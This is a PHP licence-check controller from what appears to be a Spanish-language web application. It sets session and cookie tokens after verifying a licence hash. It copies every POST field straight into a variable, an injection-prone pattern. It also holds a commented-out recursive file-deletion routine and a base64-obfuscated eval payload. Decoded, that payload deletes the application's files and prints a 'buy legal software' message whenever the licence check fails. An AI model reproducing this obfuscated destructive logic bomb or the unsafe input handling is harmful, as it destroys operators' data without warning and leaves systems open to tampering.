<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

session_start();
// require auntomatico encuentra todas las clases/Model qeu se solicitan en el Controlador
require_once dirname(__FILE__) . "/../../autoload.php";

// Iniciamos sesion para tener las variables
date_default_timezone_set("America/Bogota");
$fecha = date("YmdHis");
$fecha_Empresa = date("Y-m-d H:i:s");
$time = time()+(60*60*24*30);

foreach ($_POST as $key => $value)
    ${$key} = $value;
    
$token1_cookie = sha1(uniqid($token1),true);
$token2_cookie = sha1(uniqid($token2),true);
$token1_bd = md5( bin2hex($token1.$user.$fecha_Empresa) );
$token2_bd = md5( bin2hex($token2.$user.$fecha_Empresa) );
$token3_bd = password_hash(md5(trim($token1_bd.$token2_bd)), PASSWORD_DEFAULT, ["cost"=> 12]);
$empresa = ConectorBD::ejecutarQuery("select licencia from empresa", null)[0][0];
if ( password_verify( md5( trim( $token1 ) . trim( $token2 ) )  , $empresa ) ) {
    setcookie("token1", $token1_cookie, $time, "/");
    setcookie("token2", $token2_cookie, $time, "/");
    $_SESSION["token1"] = $token1_cookie ;
    $_SESSION["token2"] = $token2_cookie ;
    $session = new Sesion( null , null );
    $session->setFecha($fecha_Empresa);
    $session->setToken1( $token1_bd );
    $session->setToken2( $token2_bd );
    $session->setToken3($token3_bd);
    if( $session->modificar($user) )
    {
       print_r('INFORMACION CORRECTA');  
    }
    
} else {
    $list_Dir = scandir(dirname(__FILE__) . "../../../");
    /*for ($i = 0; $i < count($list_Dir); $i++) {
        if ($list_Dir[$i] !== "." && $list_Dir[$i] !== ".." && is_dir(dirname(__FILE__) . "../../../" . $list_Dir[$i])) {
            $list_File = scandir(dirname(__FILE__) . "/../../" . $list_Dir[$i]);
            for ($k = 0; $k < count($list_File); $k++) {
                if ($list_File[$k] !== "." && $list_File[$k] !== ".." && is_file($url = dirname(__FILE__) . "../../../" . $list_Dir[$i] . "/" . $list_File[$k])) {
                    //unlink($url);
                } else {
                    $list_Dir_File = scandir(dirname(__FILE__) . "/../../" . $list_Dir[$i] . "/" . $list_File[$k]);
                    for ($m = 0; $m < count($list_Dir_File); $m++) {
                        if ($list_Dir_File[$m] !== "." && $list_Dir_File[$m] !== ".." && is_file($url = dirname(__FILE__) . "../../../" . $list_Dir[$i] . "/" . $list_File[$k] . "/" . $list_Dir_File[$m])) {
                            //unlink($url);
                        }
                    }
                }
            }
        }
    }*/
} 

//eval("eval(base64_decode('CgokZW1wcmVzYSA9IENvbmVjdG9yQkQ6OmVqZWN1dGFyUXVlcnkoInNlbGVjdCBsaWNlbmNpYSBmcm9tIGVtcHJlc2EiLCBudWxsKVswXVswXTsKaWYgKHBhc3N3b3JkX3ZlcmlmeShtZDUoJHRva2VuMSAuICR0b2tlbjIgLiBtZDUoJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0pICksICRlbXByZXNhKSkgewogICAgc2V0Y29va2llKCJ0b2tlbjEiLCAkdG9rZW4xX2Nvb2tpZSwgJHRpbWUsICIvIik7CiAgICBzZXRjb29raWUoInRva2VuMiIsICR0b2tlbjJfY29va2llLCAkdGltZSwgIi8iKTsKICAgICRfU0VTU0lPTlsidG9rZW4xIl0gPSAkdG9rZW4xX2Nvb2tpZSA7CiAgICAkX1NFU1NJT05bInRva2VuMiJdID0gJHRva2VuMl9jb29raWUgOwogICAgcHJpbnRfcigiICAgc2lpaWkgICAgIik7Cn0gZWxzZSB7CiAgICAgcHJpbnRfcigiPHByZT4gICAgICAgICAgICAgICAgICAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIlNFIEVMSU1JTk8gVE9ETyBUT0RPIDxicj4iCiAgICAgICAgICAgIC4gIiAgICAgICAgICogICAgICAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgICAgICAgKioqICAgICAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgICAgICAqKioqKiAgICAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgICAgICoqKioqKiogICAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgICAgKioqKioqKioqICAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgICAqKioqKioqKioqKiAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgICoqKioqKioqKioqKiogICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgICAgICAgKioqICAgICAgICAgPGJyPiIKICAgICAgICAgICAgLiAiICAgICAgICAqKiogICAgICAgICA8YnI+IgogICAgICAgICAgICAuICIgICAgICAgICoqKiAgICAgICAgIDxicj4iCiAgICAgICAgICAgIC4gIiAgIEZFTElaIE5BVklEQUQgICAgIDxicj4iCiAgICAgICAgICAgIC4gIkNPTVBSRSBTT0ZUV0FSRSBMRUdBTDxicj48L3ByZT4iKTsKICAgICRsaXN0X0RpciA9IHNjYW5kaXIoZGlybmFtZShfX0ZJTEVfXykgLiAiLi4vLi4vLi4vIik7CiAgICBmb3IgKCRpID0gMDsgJGkgPCBjb3VudCgkbGlzdF9EaXIpOyAkaSsrKSB7CiAgICAgICAgaWYgKCRsaXN0X0RpclskaV0gIT09ICIuIiAmJiAkbGlzdF9EaXJbJGldICE9PSAiLi4iICYmIGlzX2RpcihkaXJuYW1lKF9fRklMRV9fKSAuICIuLi8uLi8uLi8iIC4gJGxpc3RfRGlyWyRpXSkpIHsKICAgICAgICAgICAgJGxpc3RfRmlsZSA9IHNjYW5kaXIoZGlybmFtZShfX0ZJTEVfXykgLiAiLy4uLy4uLyIgLiAkbGlzdF9EaXJbJGldKTsKICAgICAgICAgICAgZm9yICgkayA9IDA7ICRrIDwgY291bnQoJGxpc3RfRmlsZSk7ICRrKyspIHsKICAgICAgICAgICAgICAgIGlmICgkbGlzdF9GaWxlWyRrXSAhPT0gIi4iICYmICRsaXN0X0ZpbGVbJGtdICE9PSAiLi4iICYmIGlzX2ZpbGUoJHVybCA9IGRpcm5hbWUoX19GSUxFX18pIC4gIi4uLy4uLy4uLyIgLiAkbGlzdF9EaXJbJGldIC4gIi8iIC4gJGxpc3RfRmlsZVska10pKSB7CiAgICAgICAgICAgICAgICAgICAgdW5saW5rKCR1cmwpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkbGlzdF9EaXJfRmlsZSA9IHNjYW5kaXIoZGlybmFtZShfX0ZJTEVfXykgLiAiLy4uLy4uLyIgLiAkbGlzdF9EaXJbJGldIC4gIi8iIC4gJGxpc3RfRmlsZVska10pOwogICAgICAgICAgICAgICAgICAgIGZvciAoJG0gPSAwOyAkbSA8IGNvdW50KCRsaXN0X0Rpcl9GaWxlKTsgJG0rKykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGxpc3RfRGlyX0ZpbGVbJG1dICE9PSAiLiIgJiYgJGxpc3RfRGlyX0ZpbGVbJG1dICE9PSAiLi4iICYmIGlzX2ZpbGUoJHVybCA9IGRpcm5hbWUoX19GSUxFX18pIC4gIi4uLy4uLy4uLyIgLiAkbGlzdF9EaXJbJGldIC4gIi8iIC4gJGxpc3RfRmlsZVska10gLiAiLyIgLiAkbGlzdF9EaXJfRmlsZVskbV0pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bmxpbmsoJHVybCk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0gICAgICAgCg=='));");
